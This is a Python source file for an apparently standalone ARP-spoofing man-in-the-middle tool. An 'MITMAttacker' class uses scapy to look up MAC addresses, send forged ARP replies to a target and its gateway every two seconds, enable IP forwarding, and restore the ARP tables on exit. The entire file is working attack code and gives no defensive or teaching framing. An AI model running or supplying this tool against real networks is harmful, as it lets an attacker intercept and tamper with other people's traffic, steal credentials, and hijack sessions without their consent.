#!/usr/bin/env python3

import time
import threading
import platform
import os
from utils import enable_ip_forward, disable_ip_forward

class MITMAttacker:
    def __init__(self, target, gateway, intf):
        self.target = target
        self.gateway = gateway
        self.intf = intf
        self.running = False
        self.thread = None

        self.target_mac = None
        self.gateway_mac = None
        self.my_mac = None

        self.count = 0
        self.start_time = 0
        self.npcap = self._check_npcap()

    def _check_npcap(self):
        if platform.system() != "Windows":
            return True

        paths = [
            r"C:\Windows\System32\Npcap",
            r"C:\Program Files\Npcap",
            r"C:\Windows\System32\wpcap.dll"
        ]
        return any(os.path.exists(p) for p in paths)

    def _get_mac(self, ip):
        """Get MAC address for IP"""
        try:
            from scapy.all import ARP, Ether, srp

            # Check ARP cache first
            if platform.system() == "Windows":
                import subprocess
                r = subprocess.check_output(f"arp -a {ip}", shell=True, text=True, errors='ignore')
                for line in r.split('\n'):
                    if ip in line:
                        parts = line.split()
                        for p in parts:
                            if ':' in p or '-' in p:
                                return p.replace('-', ':')

            # Send ARP request
            arp = ARP(pdst=ip)
            eth = Ether(dst="ff:ff:ff:ff:ff:ff")
            pkt = eth/arp

            ans = srp(pkt, timeout=1, verbose=False, iface=self.intf)[0]
            if ans:
                return ans[0][1].hwsrc
        except:
            pass
        return None

    def _get_my_mac(self):
        """Get our MAC address"""
        try:
            if platform.system() == "Windows":
                import subprocess
                r = subprocess.check_output("ipconfig /all", shell=True, text=True, errors='ignore')
                for line in r.split('\n'):
                    if "Physical Address" in line and self.intf in line:
                        parts = line.split(':')
                        if len(parts) > 1:
                            return parts[1].strip().replace('-', ':')
            else:
                with open(f"/sys/class/net/{self.intf}/address") as f:
                    return f.read().strip()
        except:
            pass
        return "00:00:00:00:00:00"

    def spoof(self, target_ip, spoof_ip, target_mac=None):
        """Send spoofed ARP packet"""
        if platform.system() == "Windows" and not self.npcap:
            return False

        try:
            from scapy.all import ARP, send

            mac = target_mac or self._get_mac(target_ip)
            if not mac:
                return False

            pkt = ARP(
                op=2,
                pdst=target_ip,
                hwdst=mac,
                psrc=spoof_ip,
                hwsrc=self.my_mac
            )

            send(pkt, verbose=False, iface=self.intf)
            self.count += 1
            return True
        except:
            return False

    def restore(self, target_ip, gateway_ip):
        """Restore ARP tables"""
        if platform.system() == "Windows" and not self.npcap:
            return False

        try:
            from scapy.all import ARP, send

            target_mac = self._get_mac(target_ip)
            gateway_mac = self._get_mac(gateway_ip)

            if target_mac and gateway_mac:
                # Restore target
                pkt1 = ARP(
                    op=2,
                    pdst=target_ip,
                    hwdst=target_mac,
                    psrc=gateway_ip,
                    hwsrc=gateway_mac
                )

                # Restore gateway
                pkt2 = ARP(
                    op=2,
                    pdst=gateway_ip,
                    hwdst=gateway_mac,
                    psrc=target_ip,
                    hwsrc=target_mac
                )

                send(pkt1, count=3, verbose=False, iface=self.intf)
                send(pkt2, count=3, verbose=False, iface=self.intf)
                return True
        except:
            pass
        return False

    def start_attack(self):
        """Start MITM attack"""
        if self.running:
            return

        # Get MAC addresses
        self.target_mac = self._get_mac(self.target)
        self.gateway_mac = self._get_mac(self.gateway)
        self.my_mac = self._get_my_mac()

        if not self.target_mac or not self.gateway_mac:
            print("Could not get MAC addresses")
            return

        # Enable IP forwarding (Linux/Mac)
        if platform.system() != "Windows":
            enable_ip_forward()

        self.running = True
        self.count = 0
        self.start_time = time.time()

        print(f"MITM: {self.target} -> {self.gateway}")
        print(f"Target MAC: {self.target_mac}")
        print(f"Gateway MAC: {self.gateway_mac}")
        print(f"My MAC: {self.my_mac}")

        try:
            while self.running:
                self.spoof(self.target, self.gateway, self.target_mac)
                self.spoof(self.gateway, self.target, self.gateway_mac)
                time.sleep(2)
        except KeyboardInterrupt:
            pass
        except Exception as e:
            print(f"MITM error: {e}")
        finally:
            self.stop_attack()

    def stop_attack(self):
        """Stop attack and restore"""
        if not self.running:
            return

        self.running = False

        print("Stopping MITM...")

        # Restore ARP
        if platform.system() == "Windows":
            if self.npcap:
                self.restore(self.target, self.gateway)
        else:
            self.restore(self.target, self.gateway)

        # Disable IP forwarding
        if platform.system() != "Windows":
            disable_ip_forward()

        dur = time.time() - self.start_time
        print(f"Duration: {dur:.1f}s")
        print(f"Packets: {self.count}")
        print("Network restored")

    def get_status(self):
        return {
            "running": self.running,
            "target_ip": self.target,
            "gateway_ip": self.gateway,
            "interface": self.intf,
            "spoof_packets_sent": self.count,
            "duration": time.time() - self.start_time if self.start_time > 0 else 0,
            "npcap_available": self.npcap
        }
